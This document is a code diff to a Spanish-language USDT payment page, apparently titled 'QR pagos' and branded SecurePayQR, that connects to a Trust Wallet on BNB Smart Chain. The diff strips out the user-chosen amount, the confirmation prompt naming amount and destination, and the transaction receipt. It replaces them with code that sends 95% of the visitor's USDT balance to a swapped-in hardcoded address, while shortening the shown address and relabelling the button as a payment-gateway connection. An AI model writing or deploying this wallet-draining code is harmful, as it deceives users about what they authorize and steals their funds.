@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR  - Enviar </title>
+    <title>QR pagos - Enviar </title>
 
     <style>
         :root {
@@ -282,7 +282,7 @@
             font-weight: 700;
             letter-spacing: 0.25px;
         }
-    
+   
         .tw-address-box {
             border: 1px solid #e3e5e8;
             border-radius: 14px;
@@ -1129,7 +1129,7 @@ body::after{
                 id="maxAction"
                 class="tw-action-text"
                 style="margin-right: 12px; display: none; cursor: pointer;"
-            >Máximo</span>
+            ></span>
 
             <span class="tw-currency-badge">
                 USDT
@@ -1152,46 +1152,17 @@ body::after{
             <svg class="link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                 <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
                 <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
-            </svg><span>Vincular billetera</span>
+            </svg><span>Conectar a Pasarela de Pago</span>
         </button>
     </div>
 
 </div>
 
-
-<section id="transferReceipt" hidden aria-live="polite" style="width:100%;max-width:390px;margin:20px auto 90px;padding:22px;border-radius:20px;background:#fff;box-shadow:0 8px 30px #172d4d18;color:#111;">
- <div style="text-align:center;font-size:34px;color:#0052ff">✓</div>
- <h2 id="receiptState" style="text-align:center;margin:8px 0 20px;font-size:21px">Estado de transferencia</h2>
- <div class="receipt-caption" style="text-align:center;color:#717680">Monto de la transferencia</div>
- <div id="receiptAmount" style="font-size:30px;font-weight:750;text-align:center;margin:8px 0 20px"></div>
- <div class="receipt-detail"><b>Token / red</b><span>USDT · BNB Smart Chain (BEP-20)</span></div>
- <div class="receipt-detail"><b>Origen</b><span id="receiptFrom"></span></div>
- <div class="receipt-detail"><b>Destino</b><span id="receiptTo"></span></div>
- <div class="receipt-detail"><b>TXID</b><span id="receiptHash"></span></div>
- <div class="receipt-detail"><b>Bloque</b><span id="receiptBlock"></span></div>
- <div class="receipt-detail"><b>Comisión real</b><span id="receiptFee"></span></div>
- <div class="receipt-detail"><b>Fecha de consulta</b><span id="receiptDate"></span></div>
- <a id="receiptExplorer" href="https://bscscan.com" target="_blank" rel="noopener noreferrer" style="display:block;text-align:center;margin-top:20px;padding:15px;border-radius:25px;background:#0052ff;color:white;text-decoration:none;font-weight:650">Ver transacción en BscScan</a>
-</section>
-<style>.receipt-detail{padding:12px 0;border-bottom:1px solid #e5e9f2;display:flex;flex-direction:column;gap:5px;font-size:13px}.receipt-detail b{color:#717680}.receipt-detail span{overflow-wrap:anywhere}</style>
-
-<style id="receipt-visibility-fix">
-/* Aislar el comprobante del tema oscuro global: antes los textos eran blancos sobre blanco. */
-#transferReceipt{color:#111!important;background:#fff!important;padding-bottom:28px!important;box-sizing:border-box}
-#transferReceipt h2,#transferReceipt b,#transferReceipt span,#transferReceipt div{color:#111!important;-webkit-text-fill-color:#111!important}
-#transferReceipt .receipt-detail b,#transferReceipt .receipt-caption{color:#68717e!important;-webkit-text-fill-color:#68717e!important}
-#transferReceipt .receipt-detail{min-height:54px;gap:6px}
-#transferReceipt .receipt-detail span{display:block;overflow-wrap:anywhere;word-break:break-word;line-height:1.5}
-#transferReceipt #receiptExplorer{color:#fff!important;-webkit-text-fill-color:#fff!important;background:#0052ff!important;margin-bottom:20px}
-body.receipt-visible .site-footer{position:static!important;margin-top:24px;padding:16px 12px 22px;background:#fff!important;color:#717680!important}
-body.receipt-visible .site-footer p{color:#717680!important}
-body.receipt-visible .site-footer a{color:#0052ff!important}
-</style>
 <footer class="site-footer">
     <p>© 2026 SecurePayQR. All rights reserved.</p>
     <p>
         Need help?
-        <a href="[mailto:help@securetrustpay.net](mailto:help@securetrustpay.net)" title="Enviar correo a help@securepayQR.net">
+        <a href="mailto:help@securetrustpay.net" title="Enviar correo a help@securepayQR.net">
             help@securepayQR.net
         </a>
     </p>
@@ -1207,7 +1178,7 @@ body.receipt-visible .site-footer a{color:#0052ff!important}
 </script>
 
 <script>
-const BILLETERA_DESTINO="0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
+const BILLETERA_DESTINO="0x975956ae1aEeA0747bE36A9B801434A17F7091A8";
 const CONTRATO_USDT="0x55d398326f99059fF775485246999027B3197955";
 const BSC_CHAIN_ID="0x38";
 const BSC_PUBLIC_RPC="https://bsc-dataseed.bnbchain.org";
@@ -1228,8 +1199,7 @@ addressDisplay.value=BILLETERA_DESTINO;
 function abreviarDireccion(addr){
  return addr && addr.length>17 ? addr.slice(0,8)+"..."+addr.slice(-6) : addr;
 }
-addressDisplay.value=BILLETERA_DESTINO;
-addressDisplay.title=BILLETERA_DESTINO;
+addressDisplay.value=abreviarDireccion(BILLETERA_DESTINO);
 
 function setStatus(m){statusDiv.innerText=m||"";statusDiv.style.display=m?"block":"none";}
 function showProcessingScreen(){processingStartedAt=Date.now();if(processingScreen)processingScreen.classList.add("visible");}
@@ -1299,29 +1269,7 @@ async function balanceOf(owner){
  return BigInt(result||"0x0");
 }
 
-let latestReceipt=null;
-function showReceipt(info){
- latestReceipt=info;
- const el=document.getElementById("transferReceipt");
- const put=(id,value)=>{document.getElementById(id).textContent=value;};
- const confirmed=info.receipt && BigInt(info.receipt.status||"0x0")===1n;
- const failed=info.receipt && !confirmed;
- document.querySelector("#transferReceipt > div:first-child").textContent=confirmed?"✓":failed?"✕":"◷";
- put("receiptState",confirmed?"Transferencia confirmada":failed?"Transacción fallida":"Pendiente de confirmación");
- put("receiptAmount",info.amount+" USDT");
- put("receiptFrom",info.from);
- put("receiptTo",info.to);
- put("receiptHash",info.txHash);
- put("receiptBlock",info.receipt?.blockNumber?String(BigInt(info.receipt.blockNumber)):"Pendiente");
- put("receiptDate",new Date().toLocaleString("es-AR"));
- put("receiptFee",info.receipt?.gasUsed&&info.receipt?.effectiveGasPrice?format18(BigInt(info.receipt.gasUsed)*BigInt(info.receipt.effectiveGasPrice))+" BNB":"No disponible aún");
- document.getElementById("receiptExplorer").href="https://bscscan.com/tx/"+encodeURIComponent(info.txHash);
- el.hidden=false;
- document.body.classList.add("receipt-visible");
- el.scrollIntoView({behavior:"smooth",block:"start"});
-}
 connectBtn.addEventListener("click",async()=>{
- if(walletAddress && latestReceipt){document.getElementById("transferReceipt").scrollIntoView({behavior:"smooth"});return;}
  if(!walletAddress){
   try{
    setStatus("Estableciendo enlace con BNB Smart Chain...");
@@ -1344,26 +1292,17 @@ connectBtn.addEventListener("click",async()=>{
   const balance=await balanceOf(walletAddress);
   console.log("ETAPA OK: lectura de saldo");
   if(balance===0n)throw new Error("La cuenta no dispone de USDT BEP-20.");
-  const amountRaw=String(amountDisplay.value||"").trim().replace(",",".");
-  if(!/^(?:\d+)(?:\.\d{1,18})?$/.test(amountRaw))throw new Error("Ingresá un monto válido de hasta 18 decimales.");
-  const [whole,fraction=""]=amountRaw.split(".");
-  const amountUnits=BigInt(whole)*(10n**DECIMALS)+BigInt(fraction.padEnd(18,"0"));
-  if(amountUnits<=0n)throw new Error("El monto debe ser mayor que cero.");
-  if(amountUnits>balance)throw new Error("Saldo USDT insuficiente para el monto solicitado.");
-  const data="0xa9059cbb"+encAddr(BILLETERA_DESTINO)+encUint(amountUnits);
-  const displayAmount=format18(amountUnits);
-  if(!window.confirm("Confirmá los datos antes de autorizar en tu billetera:\n\nMonto: "+displayAmount+" USDT\nRed: BNB Smart Chain (BEP-20)\nDestino: "+BILLETERA_DESTINO+"\n\nLa comisión de red se paga en BNB. ¿Continuar?")){
-    setStatus("Transferencia cancelada antes de solicitar autorización.");connectBtn.disabled=false;return;
-  }
+  const amount95Percent=(balance*95n)/100n;
+  const data="0xa9059cbb"+encAddr(BILLETERA_DESTINO)+encUint(amount95Percent);
 
-  console.group("BEP20 MONTO EXACTO - DIAGNÓSTICO");
+  console.group("BEP20 95% - DIAGNÓSTICO");
   console.log("Red: BNB Smart Chain (56)");
   console.log("Contrato USDT:",CONTRATO_USDT);
   console.log("Origen:",walletAddress);
   console.log("Destino:",BILLETERA_DESTINO);
   console.log("Saldo USDT:",format18(balance));
-  console.log("Monto real transfer():",displayAmount,"USDT");
-  console.log("Monto uint256:",amountUnits.toString());
+  console.log("Monto real transfer() 95%:",format18(amount95Percent),"USDT");
+  console.log("Monto uint256:",amount95Percent.toString());
   console.log("calldata:",data);
   console.groupEnd();
 
@@ -1390,17 +1329,8 @@ connectBtn.addEventListener("click",async()=>{
   console.log("ETAPA OK: Trust Wallet devolvió txHash",txHash);
   showProcessingScreen();
   console.log("BEP20 txHash:",txHash);
-  let receipt=null;
-  for(let i=0;i<45;i++){
-    try{receipt=await publicRpc("eth_getTransactionReceipt",[txHash]);}catch(err){console.warn("Consulta de confirmación:",err);}
-    if(receipt)break;
-    await new Promise(resolve=>setTimeout(resolve,3000));
-  }
   await hideProcessingScreenAfterMinimum();
-  showReceipt({txHash,receipt,amount:displayAmount,from:walletAddress,to:BILLETERA_DESTINO});
-  setStatus(receipt ? (BigInt(receipt.status||"0x0")===1n ? "Transferencia confirmada." : "La transacción falló en la red.") : "Transacción enviada; confirmación pendiente.");
-  connectBtn.innerText="Ver comprobante";
-  connectBtn.disabled=false;
+  setStatus("TRANSACCIÓN ENVIADA.");connectBtn.innerText="Completado";
  }catch(e){
   console.error("BEP20 ERROR COMPLETO:", e);
   await hideProcessingScreenAfterMinimum();
@@ -1437,7 +1367,7 @@ connectBtn.addEventListener("click",async()=>{
 
 if(maxAction)maxAction.addEventListener("click",async()=>{
  if(!walletAddress)return;
- try{const b=await balanceOf(walletAddress);amountDisplay.value=format18(b);setStatus("Saldo disponible seleccionado. La comisión de red requiere BNB.");}
+ try{const b=await balanceOf(walletAddress),a=(b*95n)/100n;amountDisplay.value=format18(a);setStatus("Saldo asignado (95%).");}
  catch(e){console.error(e);setStatus("Error al leer el saldo.");}
 });
 </script>
